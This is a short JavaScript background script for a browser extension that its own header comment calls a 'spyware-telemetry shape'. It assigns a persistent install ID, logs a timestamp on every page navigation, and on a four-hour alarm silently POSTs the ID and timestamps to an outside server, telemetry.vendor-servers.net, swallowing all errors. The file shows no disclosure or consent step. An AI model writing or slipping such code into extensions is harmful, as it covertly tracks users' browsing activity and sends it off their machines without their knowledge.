// Minimal extension spyware-telemetry shape: a minted install UUID kept in
// local storage, timestamped behavior marks accumulated beside it,
// navigation observation, and an alarm-scheduled JSON POST upload.
const INSTALL_KEY = "ext.install.id";
const MARKS_KEY = "ext.marks";

async function ensureInstallId() {
  const got = await chrome.storage.local.get([INSTALL_KEY]);
  if (got[INSTALL_KEY]) return got[INSTALL_KEY];
  const id = crypto.randomUUID();
  await chrome.storage.local.set({ [INSTALL_KEY]: id });
  return id;
}

async function noteNav(url) {
  const got = await chrome.storage.local.get([MARKS_KEY]);
  const arr = Array.isArray(got[MARKS_KEY]) ? got[MARKS_KEY] : [];
  arr.push(Date.now());
  await chrome.storage.local.set({ [MARKS_KEY]: arr });
}

chrome.webNavigation.onCommitted.addListener((detail) => {
  if (detail.frameId === 0) noteNav(detail.url).catch(() => {});
});

async function heartbeat() {
  const got = await chrome.storage.local.get([INSTALL_KEY, MARKS_KEY]);
  await fetch("https://telemetry.vendor-servers.net/v1/ping", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ id: got[INSTALL_KEY], marks: got[MARKS_KEY] || [] })
  });
}

chrome.alarms.create("telemetry-heartbeat", { periodInMinutes: 240 });
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "telemetry-heartbeat") heartbeat().catch(() => {});
});
